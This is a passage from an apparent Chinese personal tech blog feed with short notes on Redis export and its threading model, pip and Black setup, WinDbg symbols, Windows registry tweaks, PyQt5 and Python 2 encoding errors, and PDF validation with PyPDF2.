class="meta prompt_"># </span><span class="language-bash">安装一个ruby版本</span></span><br><span class="line">rvm install 2.6.3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用一个ruby版本</span></span><br><span class="line">rvm use 2.6.3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置默认版本</span></span><br><span class="line">ruby --version</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载一个已知版本</span></span><br><span class="line">rvm remove 2.0.0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装redis-dump</span></span><br><span class="line">gem install redis-dump</span><br></pre></td></tr></table></figure><ul><li>导出</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-dump -u :password@127.0.0.1:6379 &gt; filename.json</span><br></pre></td></tr></table></figure><ul><li>导入</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat filename.json | redis-load -u :password@127.0.0.1:6379</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No26：为什么说Redis单线程效率高</title>
      <link href="/posts/b3afa72b.html"/>
      <url>/posts/b3afa72b.html</url>
      
        <content type="html"><![CDATA[<p>Redis效率高的主要原因有下面几个：</p><ul><li><p>基于内存操作，速度非常快</p></li><li><p>采用单线程，避免了上下文的切换导致消耗CPU</p></li><li><p>采用单线程，不用去考虑各种加锁释放锁的问题</p></li><li><p>使用IO多路复用模型，非阻塞IO</p></li></ul><p>Redis采用的是基于内存的采用的是单进程单线程模型的KV数据库，由C语言编写，官方提供的数据是可以达到100000+的QPS（每秒内查询次数）。这个数据不比采用单进程多线程的同样基于内存的<br>KV数据库Memcached差！</p><p>由于Redis使用单线程来处理命令的，所以一条命令来了之后不会立即执行，而是将命令加到一个队列中，然后逐个被执行，这样就能保证在不加锁的情况下保证不会产生并发问题。</p><p>如果Redis采用多线程执行命令，那么对于三个连接同时执行incr操作的时候，就需要添加锁来保证线程的安全性了，会大大降低执行效率。</p><p>Redis采用非阻塞IO，使用epoll作为IO多路复用技术的实现，再加上Redis自身的树碱处理模型将epoll中的连接、读写、关闭都转为事件，不在网络IO上浪费过多的事件。</p><p>当然了，单线程机制也不是万能的，也会存在一个的问题：对于每个命令的执行事件是有要求的。如果某个命令执行事件过长，会导致其他命令被阻塞，对于Redis这种高性能的服务来说是致命的。所以即使Redis性能很高，我们也要合理的去使用Redis，不合理的使用也会导致很多问题。</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No25：使用Black控制代码质量</title>
      <link href="/posts/c97e8b27.html"/>
      <url>/posts/c97e8b27.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、Black安装"><a href="#1、Black安装" class="headerlink" title="1、Black安装"></a>1、Black安装</h3><ul><li>Windows：</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install black</span><br></pre></td></tr></table></figure><p>black.exe的安装位置在Python目录下Scripts\black.exe</p><ul><li>Linux：</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pip install black</span><br></pre></td></tr></table></figure><p>black的安装位置在&#x2F;usr&#x2F;bin&#x2F;black</p><h3 id="2、配置PyCharm"><a href="#2、配置PyCharm" class="headerlink" title="2、配置PyCharm"></a>2、配置PyCharm</h3><p>File&gt;Settings&gt;Tools&gt;External Tools，点击+号添加</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Name(插件名称)</span></span><br><span class="line">Black</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Description(插件描述)</span></span><br><span class="line">Black</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Program(指向Black的安装目录)</span></span><br><span class="line">C:\Users\Administrator\Envs\django_py38\Scripts\black.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Arguments(选择Black输出信息显示格式和要<span class="built_in">disable</span>的项目)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">FilePath$</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Working directory(指定Black的工作目录)</span></span><br><span class="line">C:\Users\Administrator\Envs\django_py38\Scripts</span><br></pre></td></tr></table></figure><h3 id="3、使用Black评估代码质量"><a href="#3、使用Black评估代码质量" class="headerlink" title="3、使用Black评估代码质量"></a>3、使用Black评估代码质量</h3><p>当写完一个脚本后，直接右键单击，选择External Tools&gt;Black，运行后可得到当前代码质量，和改进建议。</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No24：pip的基本使用</title>
      <link href="/posts/50c0245a.html"/>
      <url>/posts/50c0245a.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、pip安装包下载"><a href="#1、pip安装包下载" class="headerlink" title="1、pip安装包下载"></a>1、pip安装包下载</h3><p>进入<a href="https://pypi.python.org/pypi/pip">下载地址</a>下载.tar.gz压缩包。</p><h3 id="2、安装pip"><a href="#2、安装pip" class="headerlink" title="2、安装pip"></a>2、安装pip</h3><ul><li>centos7：</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y pip</span><br><span class="line">yum install -y pip3</span><br></pre></td></tr></table></figure><ul><li>Ubuntu：</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y pip</span><br><span class="line">sudo apt-get install -y pip3</span><br></pre></td></tr></table></figure><ul><li>压缩包安装</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压压缩包</span></span><br><span class="line">tar -xzvf pip-1.5.4.tar.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入解压文件</span></span><br><span class="line">cd pip-1.5.4</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><h3 id="3、升级pip"><a href="#3、升级pip" class="headerlink" title="3、升级pip"></a>3、升级pip</h3><ul><li>Windows</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><ul><li>Linux</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install --upgrade pip</span><br></pre></td></tr></table></figure><h3 id="4、pip安装第三方包"><a href="#4、pip安装第三方包" class="headerlink" title="4、pip安装第三方包"></a>4、pip安装第三方包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install 安装包名</span><br></pre></td></tr></table></figure><h3 id="5、pip查看是否已安装"><a href="#5、pip查看是否已安装" class="headerlink" title="5、pip查看是否已安装"></a>5、pip查看是否已安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip show --files 安装包名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输出</span></span><br><span class="line">Name:SomePackage                                # 包名</span><br><span class="line">Version:1.0                                     # 版本号</span><br><span class="line">Location:/my/env/lib/pythonx.x/site-packages    # 安装位置</span><br><span class="line">Files:</span><br><span class="line">../somepackage/__init__.py [...]                # 包含文件等等</span><br></pre></td></tr></table></figure><h3 id="6、pip检查哪些包需要更新"><a href="#6、pip检查哪些包需要更新" class="headerlink" title="6、pip检查哪些包需要更新"></a>6、pip检查哪些包需要更新</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip list --outdated</span><br></pre></td></tr></table></figure><h3 id="7、pip升级包"><a href="#7、pip升级包" class="headerlink" title="7、pip升级包"></a>7、pip升级包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install --upgrade 要升级的包名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先卸载已安装的，再进行安装</span></span><br><span class="line">pip install --upgrade --force-reinstall requests==2.6.0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不会卸载已安装的，孤立已安装的旧文件，再进行安装，孤立的文件只能手动清理</span></span><br><span class="line">pip install --upgrade --ignore-installed requests==2.6.0</span><br></pre></td></tr></table></figure><h3 id="8、pip卸载包"><a href="#8、pip卸载包" class="headerlink" title="8、pip卸载包"></a>8、pip卸载包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip uninstall 要卸载的包名</span><br></pre></td></tr></table></figure><h3 id="9、导出安装的库到list-txt"><a href="#9、导出安装的库到list-txt" class="headerlink" title="9、导出安装的库到list.txt"></a>9、导出安装的库到list.txt</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip freeze &gt; list.txt</span><br></pre></td></tr></table></figure><h3 id="10、导入list-txt中列出的库到系统"><a href="#10、导入list-txt中列出的库到系统" class="headerlink" title="10、导入list.txt中列出的库到系统"></a>10、导入list.txt中列出的库到系统</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install -r list.txt</span><br></pre></td></tr></table></figure><h3 id="11、下载离线安装包"><a href="#11、下载离线安装包" class="headerlink" title="11、下载离线安装包"></a>11、下载离线安装包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip download -d 路径 -r requirments.txt</span><br></pre></td></tr></table></figure><h3 id="12、利用离线包安装，首先切换到离线包所在路径"><a href="#12、利用离线包安装，首先切换到离线包所在路径" class="headerlink" title="12、利用离线包安装，首先切换到离线包所在路径"></a>12、利用离线包安装，首先切换到离线包所在路径</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install --no-index --find-links=路径 -r requirments.txt</span><br></pre></td></tr></table></figure><h3 id="13、更换pip镜像源"><a href="#13、更换pip镜像源" class="headerlink" title="13、更换pip镜像源"></a>13、更换pip镜像源</h3><ul><li>Linux</li></ul><p>在用户目录下创建一个命名为&lt;.pip&gt;的文件夹，在该文件夹下创建一个命名为&lt;pip.conf&gt;的文件，在该文件中写入以下内容：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout=100</span><br><span class="line">index-url=https://mirrors.aliyun.com/pypi/simple</span><br><span class="line"></span><br><span class="line">[install]</span><br><span class="line">trusted-host=mirrors.aliyun.com</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Windows</li></ul><p>在用户目录下创建一个命名为<pip>的文件夹，在该文件夹下创建一个命名为&lt;pip.ini&gt;的文件，在该文件中写入以下内容：</pip></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url=https://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line">[install]</span><br><span class="line">trusted-host=mirrors.aliyun.com</span><br></pre></td></tr></table></figure><h3 id="14、pip参数解释"><a href="#14、pip参数解释" class="headerlink" title="14、pip参数解释"></a>14、pip参数解释</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip --help</span><br><span class="line"></span><br><span class="line">Usage:  pip&lt;command&gt;[options]</span><br><span class="line">Commands:</span><br><span class="line">install                   安装包.</span><br><span class="line">uninstall                 卸载包.</span><br><span class="line">freeze                    按着一定格式输出已安装包列表</span><br><span class="line">list                      列出已安装包.</span><br><span class="line">show                      显示包详细信息.</span><br><span class="line">search                    搜索包，类似yum里的search.</span><br><span class="line">wheel                     Buildwheelsfromyourrequirements.</span><br><span class="line">zip                       不推荐.Zipindividualpackages.</span><br><span class="line">unzip                     不推荐.Unzipindividualpackages.</span><br><span class="line">bundle                    不推荐.Createpybundles.</span><br><span class="line">help                      当前帮助.</span><br><span class="line"></span><br><span class="line">GeneralOptions:</span><br><span class="line">-h,--help                 显示帮助.</span><br><span class="line">-v,--verbose              更多的输出，最多可以使用3次</span><br><span class="line">-V,--version              现实版本信息然后退出.</span><br><span class="line">-q,--quiet                最少的输出.</span><br><span class="line">--log-file&lt;path&gt;          覆盖的方式记录verbose错误日志，默认文件：/root/.pip/pip.log</span><br><span class="line">--log&lt;path&gt;               不覆盖记录verbose输出的日志.</span><br><span class="line">--proxy&lt;proxy&gt;            Specifyaproxyintheform[user:passwd@]proxy.server:port.</span><br><span class="line">--timeout&lt;sec&gt;            连接超时时间(默认15秒).</span><br><span class="line">--exists-action&lt;action&gt;   Defaultactionwhenapathalreadyexists:(s)witch,(i)gnore,(w)ipe,(b)ackup.</span><br><span class="line">--cert&lt;path&gt;              证书.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No23：Windbg安装符号表</title>
      <link href="/posts/317ea9e2.html"/>
      <url>/posts/317ea9e2.html</url>
      
        <content type="html"><![CDATA[<ol><li><p>打开 Windbg，使用科学上网并设置为系统代理</p></li><li><p>CTRL+S 打开设置符号表窗口</p></li><li><p>输入 srv<em>c:\symbols</em><a href="http://msdl.microsoft.com/download/symbols">http://msdl.microsoft.com/download/symbols</a></p></li><li><p>确认 OK</p></li><li><p>符号表已下载至 C:\Symbols</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No22：pip与easy_install区别和用法</title>
      <link href="/posts/89145719.html"/>
      <url>/posts/89145719.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、区别"><a href="#1、区别" class="headerlink" title="1、区别"></a>1、区别</h3><p>easy_insall的作用和perl中的cpan，ruby中的gem类似，都提供了在线一键安装模块的傻瓜方便方式，而pip是easy_install的改进版，提供更好的提示信息，删除package等功能。老版本的python中只有easy_install，没有pip。</p><h3 id="2、easy-install的用法"><a href="#2、easy-install的用法" class="headerlink" title="2、easy_install的用法"></a>2、easy_install的用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装一个包</span></span><br><span class="line">easy_install &lt;package_name&gt;</span><br><span class="line">easy_install &quot;&lt;package_name&gt;==&lt;version&gt;&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">升级一个包</span></span><br><span class="line">easy_install -U &quot;&lt;package_name&gt;&gt;=&lt;version&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="3、pip的用法"><a href="#3、pip的用法" class="headerlink" title="3、pip的用法"></a>3、pip的用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装一个包</span></span><br><span class="line">pip install &lt;package_name&gt;</span><br><span class="line">pip install &lt;package_name&gt;==&lt;version&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">升级一个包 (如果不提供version号，升级到最新版本）</span></span><br><span class="line">pip install --upgrade &lt;package_name&gt;&gt;=&lt;version&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除一个包</span></span><br><span class="line">pip uninstall &lt;package_name&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No21：Windows为cmd设置代理</title>
      <link href="/posts/ac21e8fd.html"/>
      <url>/posts/ac21e8fd.html</url>
      
        <content type="html"><![CDATA[<p>cmd设置代理，需要执行以下命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set http_proxy=http://127.0.0.1:7890</span><br><span class="line">set https_proxy=http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>上面命令的作用是设置环境变量，会持续到cmd窗口关闭。</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No20：PyQt5常见问题汇总</title>
      <link href="/posts/7d0d40e1.html"/>
      <url>/posts/7d0d40e1.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、安装时依赖问题"><a href="#1、安装时依赖问题" class="headerlink" title="1、安装时依赖问题"></a>1、安装时依赖问题</h3><p>PyQt5在Windows10下安装需要很多依赖库，但是这些依赖库又有版本限制，试了好几次，找到相对均衡的安装版本。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip uninstall pyqt5 PyQt5-stubs pyqt5-tools</span><br><span class="line">pip install pyqt5==5.13.0 PyQt5-stubs==5.13.0.1 pyqt5-tools==5.13.0.1.5</span><br></pre></td></tr></table></figure><h3 id="2、ImportError-unable-to-find-Qt5Core-dll-on-PATH"><a href="#2、ImportError-unable-to-find-Qt5Core-dll-on-PATH" class="headerlink" title="2、ImportError: unable to find Qt5Core.dll on PATH"></a>2、ImportError: unable to find Qt5Core.dll on PATH</h3><ul><li>问题报错</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;demo.py&quot;, line 3, in &lt;module&gt;</span><br><span class="line">  File &quot;d:\python project\demo\venv\lib\site-packages\PyInstaller\loader\pyimod03_importers.py&quot;, line 627, in exec_module</span><br><span class="line">    exec(bytecode, module.__dict__)</span><br><span class="line">  File &quot;lib\site-packages\PyQt5\__init__.py&quot;, line 41, in &lt;module&gt;</span><br><span class="line">  File &quot;lib\site-packages\PyQt5\__init__.py&quot;, line 33, in find_qt</span><br><span class="line">ImportError: unable to find Qt5Core.dll on PATH</span><br><span class="line">[11632] Failed to execute script demo</span><br></pre></td></tr></table></figure><ul><li>出现原因</li></ul><p>PyQt5对系统变量的加载存在bug。</p><ul><li>解决方法</li></ul><p>在主程序中PyQt5库import之前就对系统变量进行手动设置。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">hasattr</span>(sys, <span class="string">&quot;frozen&quot;</span>):</span><br><span class="line">    os.environ[<span class="string">&quot;PATH&quot;</span>] = sys._MEIPASS + <span class="string">&quot;;&quot;</span> + os.environ[<span class="string">&quot;PATH&quot;</span>]</span><br><span class="line"><span class="keyword">from</span> PyQt5 <span class="keyword">import</span> QtCore, QtWidgets, QtGui</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> *</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No19：Windows开机默认开启数字小键盘</title>
      <link href="/posts/1c07d1b7.html"/>
      <url>/posts/1c07d1b7.html</url>
      
        <content type="html"><![CDATA[<ol><li><p>win+R输入”regedit”，打开注册表。</p></li><li><p>打开”HKEY_USERS.DEFAULT\Control Panel\Keyboard”。</p></li><li><p>双击打开”InitialKeyboardIndicators”，把数值数据设置为”2”（或者为”80000002”）。</p></li><li><p>重启电脑。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No18：Python常见问题汇总</title>
      <link href="/posts/de339e28.html"/>
      <url>/posts/de339e28.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、SyntaxError-Non-ASCII-character-‘-xe4’-in-file"><a href="#1、SyntaxError-Non-ASCII-character-‘-xe4’-in-file" class="headerlink" title="1、SyntaxError: Non-ASCII character ‘\xe4’ in file"></a>1、SyntaxError: Non-ASCII character ‘\xe4’ in file</h3><p>文件中出现了中文，且没有编码声明，Python2将默认以ASCII作为标准编码，而Python2支持的ASCII码无中文。</p><p>解决方法：</p><p>必须在文件中第一行声明文件编码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、UnicodeEncodeError-‘ascii’-codec-can’t-encode-characters-in-position-0-1-ordinal-not-in-range"><a href="#2、UnicodeEncodeError-‘ascii’-codec-can’t-encode-characters-in-position-0-1-ordinal-not-in-range" class="headerlink" title="2、UnicodeEncodeError: ‘ascii’ codec can’t encode characters in position 0-1: ordinal not in range"></a>2、UnicodeEncodeError: ‘ascii’ codec can’t encode characters in position 0-1: ordinal not in range</h3><p>此问题常见于Python2环境中。</p><p>解决方法：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2.x</span></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3、Python2写文件中文乱码"><a href="#3、Python2写文件中文乱码" class="headerlink" title="3、Python2写文件中文乱码"></a>3、Python2写文件中文乱码</h3><p>Python2中open方法是没有encoding这个参数的，如果像python3一样的写法会报异常：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">TypeError: ‘encoding’ is an invalid keyword argument for this function</span><br></pre></td></tr></table></figure><p>解决方法：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">test_1 = <span class="string">&quot;中文&quot;</span></span><br><span class="line"><span class="keyword">with</span> io.<span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(unicode(test_1, <span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    test_2 = unicode(f.read(), <span class="string">&quot;utf-8&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="4、Mac上PyCharm运行多进程报错的解决方案"><a href="#4、Mac上PyCharm运行多进程报错的解决方案" class="headerlink" title="4、Mac上PyCharm运行多进程报错的解决方案"></a>4、Mac上PyCharm运行多进程报错的解决方案</h3><p>运行时报错运行时报错</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">may have been in progress in another thread when fork() was called. We cannot safely call it or ignore it in the fork() child process. Crashing instead. Set a breakpoint on objc_initializeAfterForkError to debug.</span><br></pre></td></tr></table></figure><p>解决方案</p><p>添加环境变量:</p><p>点击窗口上的Run-&gt;Edit Configurations…-&gt;Environment variables-&gt;点击输入栏后的文件夹图标</p><p>添加内容：</p><p>key: OBJC_DISABLE_INITIALIZE_FORK_SAFETY, value: YES</p><p>完整示例：</p><p>OBJC_DISABLE_INITIALIZE_FORK_SAFETY&#x3D;YES</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No17：Windows任务栏时间显示秒</title>
      <link href="/posts/49b8d3f1.html"/>
      <url>/posts/49b8d3f1.html</url>
      
        <content type="html"><![CDATA[<ol><li><p>win+R输入”regedit”，打开注册表。</p></li><li><p>打开”HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced”。</p></li><li><p>右键空白处，选择新建一个”DWORD（32位）值”，将新建的项目命名为”ShowSecondsInSystemClock”。</p></li><li><p>双击打开”ShowSecondsInSystemClock”，把数值数据设置为”1”。</p></li><li><p>重启电脑。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No16：Python检验pdf文件是否有效</title>
      <link href="/posts/e38774e7.html"/>
      <url>/posts/e38774e7.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、基本原理"><a href="#1、基本原理" class="headerlink" title="1、基本原理"></a>1、基本原理</h3><p>利用PyPDF2的PdfFileReader模块打开pdf文件，如果不抛异常，就认为此pdf文件有效。</p><p>有时打开并不抛出异常，但是有这种警告：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">UserWarning: startxref on same line as offset [pdf.py:1680]。</span><br></pre></td></tr></table></figure><p>这种情况pdf多半也是坏的，可进一步通过页数判断。但walker在测试中发现，对于正常pdf文件，进一步通过页数判断时有时会抛出异常。</p><h3 id="2、pdf文件在本地磁盘上"><a href="#2、pdf文件在本地磁盘上" class="headerlink" title="2、pdf文件在本地磁盘上"></a>2、pdf文件在本地磁盘上</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">from</span> PyPDF2 <span class="keyword">import</span> PdfFileReader</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数为pdf文件全路径名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isValidPDF_pathfile</span>(<span class="params">pathfile</span>):</span><br><span class="line">    bValid = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># PdfFileReader(open(pathfile, &#x27;rb&#x27;))</span></span><br><span class="line">        reader = PdfFileReader(pathfile)</span><br><span class="line">        <span class="keyword">if</span> reader.getNumPages() &lt; <span class="number">1</span>:  <span class="comment"># 进一步通过页数判断。</span></span><br><span class="line">            bValid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        bValid = <span class="literal">False</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span> + traceback.format_exc())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bValid</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3、pdf是来自网络的bytes数据"><a href="#3、pdf是来自网络的bytes数据" class="headerlink" title="3、pdf是来自网络的bytes数据"></a>3、pdf是来自网络的bytes数据</h3><p>由于PdfFileReader的参数为文件名或文件对象，所以需要做一下转换</p><ul><li>方法一</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> traceback, tempfile</span><br><span class="line"><span class="keyword">from</span> PyPDF2 <span class="keyword">import</span> PdfFileReader</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数为bytes类型数据。利用临时文件。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isValidPDF_bytes</span>(<span class="params">pdfBytes</span>):</span><br><span class="line">    bValid = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fp = tempfile.TemporaryFile()</span><br><span class="line">        fp.write(pdfBytes)</span><br><span class="line">        reader = PdfFileReader(fp)</span><br><span class="line">        fp.close()</span><br><span class="line">        <span class="keyword">if</span> reader.getNumPages() &lt; <span class="number">1</span>:  <span class="comment"># 进一步通过页数判断。</span></span><br><span class="line">            bValid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        bValid = <span class="literal">False</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span> + traceback.format_exc())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bValid</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>方法二</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io, traceback</span><br><span class="line"><span class="keyword">from</span> PyPDF2 <span class="keyword">import</span> PdfFileReader</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数为bytes类型数据。利用BytesIO转换。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isValidPDF_bytes</span>(<span class="params">pdfBytes</span>):</span><br><span class="line">    bValid = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        b = io.BytesIO(pdfBytes)</span><br><span class="line">        reader = PdfFileReader(b)</span><br><span class="line">        <span class="keyword">if</span> reader.getNumPages() &lt; <span class="number">1</span>:  <span class="comment"># 进一步通过页数判断。</span></span><br><span class="line">            bValid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        bValid = <span class="literal">False</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span> + traceback.format_exc())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bValid</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3、利用PDFlib判断"><a href="#3、利用PDFlib判断" class="headerlink" title="3、利用PDFlib判断"></a>3、利用PDFlib判断</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PDFlib.PDFlib <span class="keyword">import</span> PDFlib</span><br><span class="line"><span class="keyword">from</span> 